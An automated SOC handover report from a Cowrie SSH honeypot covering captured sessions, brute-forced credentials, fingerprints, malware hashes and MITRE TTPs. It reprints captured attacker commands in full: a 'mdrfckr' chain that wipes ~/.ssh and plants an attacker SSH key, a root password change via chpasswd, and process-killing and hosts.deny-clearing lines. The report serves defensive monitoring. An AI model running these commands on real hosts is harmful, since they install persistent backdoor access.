# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-09 |
| **Generated At** | 2026-04-09T10:57:25Z |
| **Shift Time** | 10:57 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **55** |
| Confirmed Threats | **28** |
| False Positives Filtered | **27** (49.1%) |
| Unique Attacker IPs | **8** |
| Countries of Origin | **4** |
| High Severity Cases | **7** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **48** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **20** |
| Unique Credential Pairs | **15** |
| Unique Usernames | **10** |
| Unique Passwords | **15** |
| Successful Auth Pairs | **6** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 7 |
| `345gs5662d34` | 4 |
| `ubuntu` | 2 |
| `sammy` | 1 |
| `steam` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 3 |
| `sammy15!` | 1 |
| `Test@123` | 1 |
| `QWE!` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 3 |
| `sammy` | `sammy15!` | 1 |
| `ubuntu` | `Test@123` | 1 |
| `root` | `QWE!` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `QWE!` | `143.198.161.12` | 2026-04-09T09:10:18 |
| `root` | `3245gs5662d34` | `143.198.161.12` | 2026-04-09T09:10:23 |
| `root` | `qazwsx001!` | `143.198.161.12` | 2026-04-09T09:12:31 |
| `root` | `123qweASD!` | `14.103.121.146` | 2026-04-09T10:48:53 |
| `root` | `3245gs5662d34` | `14.103.121.146` | 2026-04-09T10:49:00 |
| `root` | `abc123456!` | `14.103.121.146` | 2026-04-09T10:50:32 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **55** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 27 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 27 | 4 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 27 | 4 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:JruoXtsc3NlT"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `143.198.161.12`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.103.121.146`, `143.198.161.12`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **8** |
| Unique ASNs | **8** |
| High-Risk ASNs | **5** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 1 | LOW |
| `AS26077` | Nextlink Broadband | 1 | HIGH |
| `AS9583` | Sify Limited | 1 | HIGH |
| `AS58563` | CHINANET Hubei province network | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS5378` | Vodafone Limited | 1 | LOW |
| `AS8075` | Microsoft Corporation | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (7)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-58e82c3c6656

| Field | Detail |
|---|---|
| **Source IP** | `143.198.161[.]12` |
| **First Seen** | 2026-04-09 09:10 |
| **Last Seen** | 2026-04-09 09:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 09:10:17` | `cowrie.session.connect` |
| `2026-04-09 09:10:17` | `cowrie.client.version` |
| `2026-04-09 09:10:17` | `cowrie.client.kex` |
| `2026-04-09 09:10:18` | `cowrie.login.success` |
| `2026-04-09 09:10:19` | `cowrie.session.params` |
| `2026-04-09 09:10:19` | `cowrie.command.input` |
| `2026-04-09 09:10:19` | `cowrie.command.failed` |
| `2026-04-09 09:10:19` | `cowrie.log.closed` |
| `2026-04-09 09:10:19` | `cowrie.session.params` |
| `2026-04-09 09:10:19` | `cowrie.command.input` |
| `2026-04-09 09:10:19` | `cowrie.session.file_download` |
| `2026-04-09 09:10:19` | `cowrie.log.closed` |
| `2026-04-09 09:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.198.161[.]12` to AbuseIPDB if not already reported
- [ ] Block `143.198.161[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-626800227183

| Field | Detail |
|---|---|
| **Source IP** | `143.198.161[.]12` |
| **First Seen** | 2026-04-09 09:10 |
| **Last Seen** | 2026-04-09 09:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 09:10:22` | `cowrie.session.connect` |
| `2026-04-09 09:10:22` | `cowrie.client.version` |
| `2026-04-09 09:10:22` | `cowrie.client.kex` |
| `2026-04-09 09:10:23` | `cowrie.login.success` |
| `2026-04-09 09:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.198.161[.]12` to AbuseIPDB if not already reported
- [ ] Block `143.198.161[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86badd5ba0af

| Field | Detail |
|---|---|
| **Source IP** | `143.198.161[.]12` |
| **First Seen** | 2026-04-09 09:12 |
| **Last Seen** | 2026-04-09 09:12 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:JruoXtsc3NlT"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 09:12:29` | `cowrie.session.connect` |
| `2026-04-09 09:12:29` | `cowrie.client.version` |
| `2026-04-09 09:12:30` | `cowrie.client.kex` |
| `2026-04-09 09:12:31` | `cowrie.login.success` |
| `2026-04-09 09:12:31` | `cowrie.session.params` |
| `2026-04-09 09:12:31` | `cowrie.command.input` |
| `2026-04-09 09:12:31` | `cowrie.command.failed` |
| `2026-04-09 09:12:31` | `cowrie.log.closed` |
| `2026-04-09 09:12:32` | `cowrie.session.params` |
| `2026-04-09 09:12:32` | `cowrie.command.input` |
| `2026-04-09 09:12:32` | `cowrie.session.file_download` |
| `2026-04-09 09:12:32` | `cowrie.log.closed` |
| `2026-04-09 09:12:44` | `cowrie.session.params` |
| `2026-04-09 09:12:44` | `cowrie.command.input` |
| `2026-04-09 09:12:44` | `cowrie.log.closed` |
| `2026-04-09 09:12:44` | `cowrie.session.params` |
| `2026-04-09 09:12:44` | `cowrie.command.input` |
| `2026-04-09 09:12:45` | `cowrie.log.closed` |
| `2026-04-09 09:12:45` | `cowrie.session.params` |
| `2026-04-09 09:12:45` | `cowrie.command.input` |
| `2026-04-09 09:12:45` | `cowrie.session.file_download` |
| `2026-04-09 09:12:45` | `cowrie.log.closed` |
| `2026-04-09 09:12:46` | `cowrie.session.params` |
| `2026-04-09 09:12:46` | `cowrie.command.input` |
| `2026-04-09 09:12:46` | `cowrie.log.closed` |
| `2026-04-09 09:12:46` | `cowrie.session.params` |
| `2026-04-09 09:12:46` | `cowrie.command.input` |
| `2026-04-09 09:12:47` | `cowrie.log.closed` |
| `2026-04-09 09:12:47` | `cowrie.session.params` |
| `2026-04-09 09:12:47` | `cowrie.command.input` |
| `2026-04-09 09:12:47` | `cowrie.command.input` |
| `2026-04-09 09:12:47` | `cowrie.log.closed` |
| `2026-04-09 09:12:48` | `cowrie.session.params` |
| `2026-04-09 09:12:48` | `cowrie.command.input` |
| `2026-04-09 09:12:48` | `cowrie.log.closed` |
| `2026-04-09 09:12:49` | `cowrie.session.params` |
| `2026-04-09 09:12:49` | `cowrie.command.input` |
| `2026-04-09 09:12:49` | `cowrie.log.closed` |
| `2026-04-09 09:12:49` | `cowrie.session.params` |
| `2026-04-09 09:12:49` | `cowrie.command.input` |
| `2026-04-09 09:12:49` | `cowrie.log.closed` |
| `2026-04-09 09:12:50` | `cowrie.session.params` |
| `2026-04-09 09:12:50` | `cowrie.command.input` |
| `2026-04-09 09:12:50` | `cowrie.log.closed` |
| `2026-04-09 09:12:51` | `cowrie.session.params` |
| `2026-04-09 09:12:51` | `cowrie.command.input` |
| `2026-04-09 09:12:51` | `cowrie.log.closed` |
| `2026-04-09 09:12:51` | `cowrie.session.params` |
| `2026-04-09 09:12:51` | `cowrie.command.input` |
| `2026-04-09 09:12:51` | `cowrie.log.closed` |
| `2026-04-09 09:12:52` | `cowrie.session.params` |
| `2026-04-09 09:12:52` | `cowrie.command.input` |
| `2026-04-09 09:12:52` | `cowrie.log.closed` |
| `2026-04-09 09:12:53` | `cowrie.session.params` |
| `2026-04-09 09:12:53` | `cowrie.command.input` |
| `2026-04-09 09:12:53` | `cowrie.log.closed` |
| `2026-04-09 09:12:53` | `cowrie.session.params` |
| `2026-04-09 09:12:53` | `cowrie.command.input` |
| `2026-04-09 09:12:54` | `cowrie.log.closed` |
| `2026-04-09 09:12:54` | `cowrie.session.params` |
| `2026-04-09 09:12:54` | `cowrie.command.input` |
| `2026-04-09 09:12:54` | `cowrie.log.closed` |
| `2026-04-09 09:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.198.161[.]12` to AbuseIPDB if not already reported
- [ ] Block `143.198.161[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3945a498aabe

| Field | Detail |
|---|---|
| **Source IP** | `14.103.121[.]146` |
| **First Seen** | 2026-04-09 10:48 |
| **Last Seen** | 2026-04-09 10:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 10:48:52` | `cowrie.session.connect` |
| `2026-04-09 10:48:52` | `cowrie.client.version` |
| `2026-04-09 10:48:52` | `cowrie.client.kex` |
| `2026-04-09 10:48:53` | `cowrie.login.success` |
| `2026-04-09 10:48:54` | `cowrie.session.params` |
| `2026-04-09 10:48:54` | `cowrie.command.input` |
| `2026-04-09 10:48:54` | `cowrie.command.failed` |
| `2026-04-09 10:48:54` | `cowrie.log.closed` |
| `2026-04-09 10:48:54` | `cowrie.session.params` |
| `2026-04-09 10:48:54` | `cowrie.command.input` |
| `2026-04-09 10:48:55` | `cowrie.session.file_download` |
| `2026-04-09 10:48:55` | `cowrie.log.closed` |
| `2026-04-09 10:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.121[.]146` to AbuseIPDB if not already reported
- [ ] Block `14.103.121[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa57341dfd9e

| Field | Detail |
|---|---|
| **Source IP** | `14.103.121[.]146` |
| **First Seen** | 2026-04-09 10:48 |
| **Last Seen** | 2026-04-09 10:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 10:48:57` | `cowrie.session.connect` |
| `2026-04-09 10:48:57` | `cowrie.client.version` |
| `2026-04-09 10:48:57` | `cowrie.client.kex` |
| `2026-04-09 10:49:00` | `cowrie.login.success` |
| `2026-04-09 10:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.121[.]146` to AbuseIPDB if not already reported
- [ ] Block `14.103.121[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa4f271766d5

| Field | Detail |
|---|---|
| **Source IP** | `14.103.121[.]146` |
| **First Seen** | 2026-04-09 10:50 |
| **Last Seen** | 2026-04-09 10:50 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 10:50:31` | `cowrie.session.connect` |
| `2026-04-09 10:50:31` | `cowrie.client.version` |
| `2026-04-09 10:50:32` | `cowrie.client.kex` |
| `2026-04-09 10:50:32` | `cowrie.login.success` |
| `2026-04-09 10:50:32` | `cowrie.session.params` |
| `2026-04-09 10:50:32` | `cowrie.command.input` |
| `2026-04-09 10:50:32` | `cowrie.command.failed` |
| `2026-04-09 10:50:44` | `cowrie.log.closed` |
| `2026-04-09 10:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.121[.]146` to AbuseIPDB if not already reported
- [ ] Block `14.103.121[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e7971eeb09b

| Field | Detail |
|---|---|
| **Source IP** | `14.103.121[.]146` |
| **First Seen** | 2026-04-09 10:50 |
| **Last Seen** | 2026-04-09 10:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 10:50:41` | `cowrie.session.connect` |
| `2026-04-09 10:50:41` | `cowrie.client.version` |
| `2026-04-09 10:50:41` | `cowrie.client.kex` |
| `2026-04-09 10:50:45` | `cowrie.login.success` |
| `2026-04-09 10:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.121[.]146` to AbuseIPDB if not already reported
- [ ] Block `14.103.121[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.103.121[.]146` | **10** | 2026-04-09 10:42 | 2026-04-09 10:56 | 4m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `143.198.161[.]12` | **6** | 2026-04-09 09:05 | 2026-04-09 09:25 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `119.96.158[.]87` | **3** | 2026-04-09 10:39 | 2026-04-09 10:49 | 4m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `107.178.7[.]126` | 1 | 2026-04-09 09:34 | 2026-04-09 09:34 | 30s | 0 | `T1592` | 🟢 LOW |
| `124.7.227[.]98` | 1 | 2026-04-09 09:05 | 2026-04-09 09:05 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `107.178.7[.]126` | US | Nextlink Broadband | **100** ⚠️ | 50 |
| `124.7.227[.]98` | IN | Sify Limited | **100** ⚠️ | 50 |
| `119.96.158[.]87` | CN | CHINANET Hubei province network | **100** ⚠️ | 50 |
| `143.198.161[.]12` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `14.103.121[.]146` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `13.83.166[.]229` | US | Microsoft Corporation | **33** | 0 |
| `90.251.127[.]200` | GB | Vodafone Wholesale Broadband | **25** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 28 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 13 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (27 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 26 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 55 cases |
| Tool 34  | Credential Extractor        | ✅ 20 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 8 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 27 filtered (49.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 8 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 7 priority case(s) shown individually · 5 recon entry/entries in table (3 group(s) consolidating 19 session(s)).

---

## 📋 Standing Orders for Next Shift

